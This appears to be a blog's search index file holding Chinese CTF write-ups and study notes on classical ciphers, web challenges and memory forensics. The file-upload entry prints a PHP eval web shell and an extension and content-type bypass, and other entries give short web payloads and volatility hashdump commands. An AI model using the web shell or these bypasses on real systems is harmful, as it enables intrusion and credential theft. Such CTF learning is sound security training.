@@ -1,0 +1,221 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>欢迎来到young的世界</title>
+    <url>/2020/05/26/hello-world/</url>
+    <content><![CDATA[<p><img src="/2020/05/26/hello-world/1591289497089.jpeg" alt="alt"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第一届nex网络安全实践能力赛</title>
+    <url>/2020/06/02/%E7%AC%AC%E4%B8%80%E5%B1%8Anex%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="第一届nex网络安全实践能力赛"><a href="#第一届nex网络安全实践能力赛" class="headerlink" title="第一届nex网络安全实践能力赛"></a>第一届nex网络安全实践能力赛</h1><h2 id="Ps"><a href="#Ps" class="headerlink" title="Ps"></a>Ps</h2><p> 将图片保存下来，用文本打开，发现用户名<br> 发现该图为GIF动图，用PS打开图片，在第二帧里发现密码 登录获得flag</p>
+<h2 id="Flash"><a href="#Flash" class="headerlink" title="Flash"></a>Flash</h2><p> Ctrl+u查看源码，下载caidao.swf，在网上随便下个flash反编译工具，我下的是JPEXS，然后打开文件，在脚本一栏发现线索并得到密码1231856318</p>
+<h2 id="http-114-112-74-142-85-24-index-php"><a href="#http-114-112-74-142-85-24-index-php" class="headerlink" title="http://114.112.74.142:85/24/index.php"></a><a href="http://114.112.74.142:85/24/index.php" target="_blank" rel="noopener">http://114.112.74.142:85/24/index.php</a></h2><p> 文件上传，随便上传一个php文件发现被禁止上传，写一句话马，将文件后缀名改成.Php，上传得到flag </p>
+<h2 id="数字B"><a href="#数字B" class="headerlink" title="数字B"></a>数字B</h2><p> 看名字联想到rot13，随便找个网站转换一下再base64转换得到flag</p>
+<h2 id="直接怼"><a href="#直接怼" class="headerlink" title="直接怼"></a>直接怼</h2><p> 将图片转存，用winhex打开发现图片文件头缺失，修补一下得到图片</p>
+<h2 id="http-114-112-74-142-85-41"><a href="#http-114-112-74-142-85-41" class="headerlink" title="http://114.112.74.142:85/41/"></a><a href="http://114.112.74.142:85/41/" target="_blank" rel="noopener">http://114.112.74.142:85/41/</a></h2><p> 一道简单的web题，构造payload<code>/?password[]=1</code>得到flag </p>
+<h2 id="http-114-112-74-142-85-26-index-php"><a href="#http-114-112-74-142-85-26-index-php" class="headerlink" title="http://114.112.74.142:85/26/index.php"></a><a href="http://114.112.74.142:85/26/index.php" target="_blank" rel="noopener">http://114.112.74.142:85/26/index.php</a></h2><p> 简单的正则题，构造payload <code>/?id=ket1ghtkey11rt11:/1/fg1key</code>得到flag</p>
+<h2 id="http-114-112-74-142-85-36"><a href="#http-114-112-74-142-85-36" class="headerlink" title="http://114.112.74.142:85/36/"></a><a href="http://114.112.74.142:85/36/" target="_blank" rel="noopener">http://114.112.74.142:85/36/</a></h2><p> 怀疑出题人放错题了，跟上面一道web题解法一模一样，构造payload <code>/?password[]=1</code></p>
+<h2 id="数据包系列2"><a href="#数据包系列2" class="headerlink" title="数据包系列2"></a>数据包系列2</h2><p> 流量分析，导出对象HTTP，有个up.php不对劲,记事本打开发现flag </p>
+<h2 id="http-114-112-74-142-85-45"><a href="#http-114-112-74-142-85-45" class="headerlink" title="http://114.112.74.142:85/45/"></a><a href="http://114.112.74.142:85/45/" target="_blank" rel="noopener">http://114.112.74.142:85/45/</a></h2><p>参考X-NUCA 2017 Web练习 By Assassin，附上链接<a href="https://blog.csdn.net/qq_35078631/article/details/77151486" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/77151486</a>   就改了几个字母和数字而已,把payload的改下,<code>/?foo={&quot;bar1&quot;:&quot;2018a&quot;,&quot;bar2&quot;:[[1],1,2,3,0],&quot;a2&quot;:[&quot;nudt&quot;,1,2,3,0]}&amp;cat[0]=%00hongya2017&amp;cat[1]=1111&amp;d=1</code></p>
+<h2 id="Winhex"><a href="#Winhex" class="headerlink" title="Winhex"></a>Winhex</h2><p> 下载图片用winhex打开，flag在最后面</p>
+<h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><p> F12打开工作台，flag在css里面 </p>
+<h2 id="http-114-112-74-142-85-35"><a href="#http-114-112-74-142-85-35" class="headerlink" title="http://114.112.74.142:85/35/"></a><a href="http://114.112.74.142:85/35/" target="_blank" rel="noopener">http://114.112.74.142:85/35/</a></h2><p> 首先<code>?hello=welcome</code>得到提示是管理员，然后抓包修改cookie中的user为admin，返回得到flag </p>
+<h2 id="http-114-112-74-142-85-44"><a href="#http-114-112-74-142-85-44" class="headerlink" title="http://114.112.74.142:85/44/"></a><a href="http://114.112.74.142:85/44/" target="_blank" rel="noopener">http://114.112.74.142:85/44/</a></h2><p> 之前好像做过一道类似的题目，抓包看一下 ，访问得到源码<br> 两次url编码绕过 <code>?user=%2561%2564%256d%2569%256e</code></p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>古典密码学习笔记</title>
+    <url>/2020/06/04/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="凯撒密码（移位密码）"><a href="#凯撒密码（移位密码）" class="headerlink" title="凯撒密码（移位密码）"></a>凯撒密码（移位密码）</h3><p>通过明文在字母表中的偏位位数加密例如偏移量为3位的时候：A对D，B对应E，C对应F等。。。</p>
+<p>偏移量为13位的时候凯撒密码又叫 回转密码（ROT13）:明文加密得到密文，密文再加密就会得到明文（因为偏移量为13位一共 26个字母，加密两次就会回到明文了），在CTF中题目关键字眼 会有回转、回旋、十三踢等字眼。</p>
+<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><p>用 “ . ” 和 “ - ”的排列表达26个字母和数字0-9 ，附上转换网址<a href="http://www.all-tool.cn/Tools/morse/?&amp;rand=e1b8d5dad9b26794ae8dd5474a02f755" target="_blank" rel="noopener">http://www.all-tool.cn/Tools/morse/?&amp;rand=e1b8d5dad9b26794ae8dd5474a02f755</a></p>
+<h3 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码"></a>当铺密码</h3><p>当铺密码 [1] 就是一种将中文和<a href="https://baike.baidu.com/item/数字/6204" target="_blank" rel="noopener">数字</a>进行转化的<a href="https://baike.baidu.com/item/密码/65553" target="_blank" rel="noopener">密码</a>，<a href="https://baike.baidu.com/item/算法" target="_blank" rel="noopener">算法</a>相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125</p>
+<h3 id="playfair密码"><a href="#playfair密码" class="headerlink" title="playfair密码"></a>playfair密码</h3><p>用5x5的表格，格子放26个字母（I 和J算一个格子 ）正好放满25个格子。有密钥的话先往各自中不重复的顺序填入再按照26个字母顺序填入密钥中没有的其他字母</p>
+<table>
+<thead>
+<tr>
+<th>C</th>
+<th>D</th>
+<th>F</th>
+<th>M</th>
+<th>T</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>R</td>
+<td>O</td>
+<td>H</td>
+<td>N</td>
+<td>U</td>
+</tr>
+<tr>
+<td>A</td>
+<td>G</td>
+<td>I ( J )</td>
+<td>P</td>
+<td>V</td>
+</tr>
+<tr>
+<td>Z</td>
+<td>B</td>
+<td>K</td>
+<td>Q</td>
+<td>W</td>
+</tr>
+<tr>
+<td>Y</td>
+<td>E</td>
+<td>L</td>
+<td>S</td>
+<td>X</td>
+</tr>
+</tbody></table>
+<p>先整理明文：将明文每两个字母组成一对。如果成对后有两个相同字母紧挨或最后一个字母是单个的，就插入一个字母X（或者Q）例如：明文where there is life,there is hope.可先整理为：WH ER ET HE RE IS LI FE TH ER EI SH OP EX然后密文为：KU YO XD OL OY PL FK DL FU YO LG LN NG LY将密文变成大写，然后几个字母一组排列。如5个一组就是KUYOX DOLOY PLFKD LFUYO LGLNN GLY</p>
+<p>网址：<a href="http://practicalcryptography.com/ciphers/playfair-cipher/" target="_blank" rel="noopener">http://practicalcryptography.com/ciphers/playfair-cipher/</a></p>
+<h3 id="栏栅密码"><a href="#栏栅密码" class="headerlink" title="栏栅密码"></a>栏栅密码</h3><p>把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。</p>
+<h3 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h3><p>分base16、base32、base64</p>
+<p>base64中包含大写字母（A-Z）、小写字母（a-z）、数字0——9以及+/</p>
+<p>base32中只有大写字母（A-Z）和数字234567</p>
+<p>base16中只有数字0-9以及大写字母ABCDEF</p>
+<h6 id="部分内容转载于Thsreesoil博客-https-www-cnblogs-com-threesoil-p-9857897-html"><a href="#部分内容转载于Thsreesoil博客-https-www-cnblogs-com-threesoil-p-9857897-html" class="headerlink" title="部分内容转载于Thsreesoil博客 https://www.cnblogs.com/threesoil/p/9857897.html"></a>部分内容转载于Thsreesoil博客 <a href="https://www.cnblogs.com/threesoil/p/9857897.html" target="_blank" rel="noopener">https://www.cnblogs.com/threesoil/p/9857897.html</a></h6>]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传刷题记录</title>
+    <url>/2020/06/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="攻防世界web-upload1"><a href="#攻防世界web-upload1" class="headerlink" title="攻防世界web upload1"></a>攻防世界web upload1</h2><p>查看源码发现前端识别文件后缀名只能为jpg或png</p>
+<img src="/2020/06/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1.png" alt="alt" style="zoom:80%;">
+
+<p>写一句话马<?php @eval($_POST['pass']);?>，将文件名改为1.png</p>
+<p>上传时抓包<img src="/2020/06/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2.png" alt="alt" style="zoom: 80%;">将1.png改回1.php，image/png改为text/html，发送。菜刀连接<img src="/2020/06/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/3.png" alt="1" style="zoom:80%;"></p>
+<p>得到flag<img src="/2020/06/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4.png" alt></p>
+]]></content>
+      <categories>
+        <category>刷题记录</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>各种解题笔记链接</title>
+    <url>/2020/06/16/%E5%90%84%E7%A7%8D%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0%E9%93%BE%E6%8E%A5/</url>
+    <content><![CDATA[<p>本着手懒脚懒的特性，懒得总结，直接附上各个师傅的刷题记录吧</p>
+<h1 id="比赛wp"><a href="#比赛wp" class="headerlink" title="比赛wp"></a>比赛wp</h1><p>[DozerCTF 2020]Write up(HA1C9ON)<a href="http://ha1c9on.top/2020/06/14/dozerctf-2020write-up/" target="_blank" rel="noopener">http://ha1c9on.top/2020/06/14/dozerctf-2020write-up/</a></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="usb流量分析"><a href="#usb流量分析" class="headerlink" title="usb流量分析"></a>usb流量分析</h2><p>记一道比较复杂的USB流量分析题:<a href="http://www.ga1axy.top/index.php/archives/10/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/10/</a></p>
+<p>深入理解USB流量数据包的抓取与分析：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html#_label1" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html#_label1</a></p>
+]]></content>
+      <tags>
+        <tag>链接</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内存取证学习笔记</title>
+    <url>/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">volatility</span> <span class="selector-tag">-f</span> <span class="selector-tag">mem</span><span class="selector-class">.raw</span> <span class="selector-tag">imageinfo</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6.png" alt>如下显示的系统都有可能，可以一个个的试试</p>
+<h3 id="查看运行程序列表"><a href="#查看运行程序列表" class="headerlink" title="查看运行程序列表"></a>查看运行程序列表</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="attribute">--profile</span>=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt></p>
+<h3 id="提取出内存中记录的-当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息"><a href="#提取出内存中记录的-当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息" class="headerlink" title="提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息"></a>提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.vmem <span class="attribute">--profile</span>=WinXPSP2x86 userassist</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7.png" alt></p>
+<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="attribute">--profile</span>=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt>一般文件会很多，不易查看，用grep命令过滤</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="attribute">--profile</span>=Win7SP1x64 filescan |grep txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt>这里显示出了txt文件，下面将他们分离出来</p>
+<h3 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">volatility -f mem.dump <span class="params">--profile=Win7SP1x64</span> dumpfiles -Q 0x3e435890 -D <span class="string">./</span></span><br></pre></td></tr></table></figure>
+
+<p>-Q是偏移量，-D是存储的文件夹</p>
+<h3 id="查看cmd下执行的文件"><a href="#查看cmd下执行的文件" class="headerlink" title="查看cmd下执行的文件"></a>查看cmd下执行的文件</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="attribute">--profile</span>=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.png" alt></p>
+<p>可以看到，flag已经被找到，不过出题人并没有将flag放在一个文件里,只是个文件 名，若是放在某个文件里，会加大我们的难度</p>
+<h3 id="分离出cmd下执行的某个文件"><a href="#分离出cmd下执行的某个文件" class="headerlink" title="分离出cmd下执行的某个文件"></a>分离出cmd下执行的某个文件</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="params">--profile=Win7SP1x64</span> memdump -p 2884 -D <span class="string">/.</span></span><br></pre></td></tr></table></figure>
+
+<p>-p是进程号，flag的文件在进程号为2884，分离出的文件为流量包</p>
+<h3 id="提取账户密码"><a href="#提取账户密码" class="headerlink" title="提取账户密码"></a>提取账户密码</h3><h5 id="列出SAM表用户"><a href="#列出SAM表用户" class="headerlink" title="列出SAM表用户"></a>列出SAM表用户</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.dump <span class="attribute">--profile</span>=Win7SP0x64 printkey -K </span><br><span class="line">volatility -f mem.vmem <span class="attribute">--profile</span>=WinXPSP2x86 hivelist</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" style="zoom:80%;">
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8.png" alt></p>
+<h5 id="获取内存中的系统密码，我们可以使用-hashdump-将它提取出来。"><a href="#获取内存中的系统密码，我们可以使用-hashdump-将它提取出来。" class="headerlink" title="获取内存中的系统密码，我们可以使用 hashdump 将它提取出来。"></a>获取内存中的系统密码，我们可以使用 hashdump 将它提取出来。</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.vmem <span class="attribute">--profile</span>=WinXPSP2x86 hashdump -y （注册表<span class="built_in"> system </span>的 virtual 地址 ）-s （SAM 的 virtual 地址）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/9.png" alt></p>
+<p>hash值解码：<a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p>
+<h3 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="attribute">--profile</span>=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/06/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5.png" style="zoom: 67%;">
+
+<h3 id="查看已经建立的网络连接"><a href="#查看已经建立的网络连接" class="headerlink" title="查看已经建立的网络连接"></a>查看已经建立的网络连接</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw <span class="attribute">--profile</span>=Win7SP1x64 netscan|grep ESTABLISHED</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取-IE-浏览器的使用情况"><a href="#获取-IE-浏览器的使用情况" class="headerlink" title="获取 IE 浏览器的使用情况"></a>获取 IE 浏览器的使用情况</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">volatility -f mem.vmem <span class="attribute">--profile</span>=WinXPSP2x86 iehistory</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>内存取证</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dozerctf内存取证</title>
+    <url>/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
+    <content><![CDATA[<p>第一步：常规操作，查看系统信息及运行程序列表</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">volatility -f <span class="number">1.</span><span class="built_in">dump</span> imageinfo</span><br><span class="line">volatility -f <span class="number">1.</span><span class="built_in">dump</span> <span class="comment">--profile=Win7SP1x64 pslist</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1.png" style="zoom:67%;">
+
+<img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/2.png" style="zoom:67%;">
+
+<p>发现cmd可能有flag操作的地方，看看出题人用cmd做了什么</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">volatility -f <span class="number">1.</span><span class="built_in">dump</span> <span class="comment">--profile=Win7SP1x64 cmdscan</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/3.png" style="zoom: 80%;">
+
+<p>查找flag </p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">volatility -f <span class="number">1</span>.<span class="keyword">dump</span> --profile=Win7SP1x64 filescan |<span class="keyword">grep</span> flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/4.png" alt></p>
+<p>发现flag文件夹有个analys，我们将它取出 </p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">volatility -f <span class="number">1.</span>dump --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000001e85f430</span> -D ./</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/5.png" style="zoom:80%;">
+
+<p>有密码，根据注释猜测是系统密码</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">volatility -f <span class="number">1.</span>dump --profile=Win7SP1x64 hivelist</span><br><span class="line">volatility -f <span class="number">1.</span>dump --profile=Win7SP1x64 hashdump -y <span class="number">0xfffff8a000024010</span> -s <span class="number">0xfffff8a00167a010</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/6.png" alt></p>
+<p>md5解密得到密码</p>
+<p><img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/7.png" alt></p>
+<p>解压后flag的密码应该在usb.pcap里面，然后就是usb流量分析了</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tshark</span> -r usb.pcap -T fields -e usb.capdata | sed <span class="string">'/^\s*$/d'</span> &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
+
+<p>到了这一步有一个坑，我看其他有关usb流量分析的博客文本里面都带冒号的，可能我版本问题提取出来的文本没带冒号，然后给的py脚本就一直报错</p>
+<p>找一个加冒号的脚本，然后就可以提取出键盘信息了<img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/8.png" alt></p>
+<p>删去 <code>[DEL]</code> 前对应字符，得到：<br>$$<br>YLLTMFTNXBKGVCYYDBUHDLCPSPSPTSWRMWJJMNJGTYLKEGITTOIBGO<br>$$<br>挂自动密匙爆破脚本得到压缩密码，是个base64加密<img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/9.png" alt></p>
+<p><img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/10.png" alt></p>
+<p><img src="/2020/06/17/Dozerctf%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/11.png" alt></p>
+]]></content>
+      <categories>
+        <category>刷题记录</category>
+      </categories>
+      <tags>
+        <tag>内存取证</tag>
+      </tags>
+  </entry>
+</search>
